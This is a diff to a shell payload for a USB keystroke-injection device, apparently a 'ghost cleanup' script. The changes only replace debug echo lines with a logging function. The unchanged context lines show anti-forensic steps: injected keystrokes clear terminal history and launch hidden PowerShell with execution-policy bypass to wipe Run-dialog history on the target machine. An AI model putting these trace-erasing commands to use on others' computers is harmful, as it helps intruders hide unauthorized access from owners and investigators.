@@ -43,7 +43,7 @@ fi
 if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
     OS="UNITY"
 fi
-echo "${OS}" >> "${DEBUG_FILE}"
+debug_log "${OS}"
 # END PLATFORM CHECK
 
 
@@ -59,7 +59,7 @@ init_keyboard()
             KEYBOARD="ATTACKMODE HID"
          fi
     fi
-    echo "${KEYBOARD}" >> "${DEBUG_FILE}"
+    debug_log "${KEYBOARD}"
     ${KEYBOARD}
     QUACK DELAY 500
 }
@@ -83,8 +83,6 @@ wait_enter_wait()
     else
         AFTER_WAIT=$2
     fi
-    echo "${BEFORE_WAIT}" >> "${DEBUG_FILE}"
-    echo "${AFTER_WAIT}" >> "${DEBUG_FILE}"
 
     QUACK DELAY ${BEFORE_WAIT}
     QUACK ENTER
@@ -104,7 +102,7 @@ clear_history_from_terminal()
         QUACK STRING history -c
         wait_enter_wait
     fi
-    echo "HISTORY CLEARED FROM TERMINAL" >> "${DEBUG_FILE}"
+    debug_log "HISTORY CLEARED FROM TERMINAL"
 }
 
 clear_history_from_powershell()
@@ -119,7 +117,7 @@ clear_history_from_powershell()
      QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
      wait_enter_wait
     fi
-    echo "HISTORY CLEARED FROM POWERSHELL" >> "${DEBUG_FILE}"
+    debug_log "HISTORY CLEARED FROM POWERSHELL"
 }
 
 unmount_drive_from_mac()
@@ -140,7 +138,7 @@ remove_windows_network_adapters()
     # QUACK STRING netsh delete profile interface= $ADAPTER
 }
 
-echo "FUNCTIONS LOADED" >> "${DEBUG_FILE}"
+debug_log "FUNCTIONS LOADED"
 # END FUNCTIONS
 
 
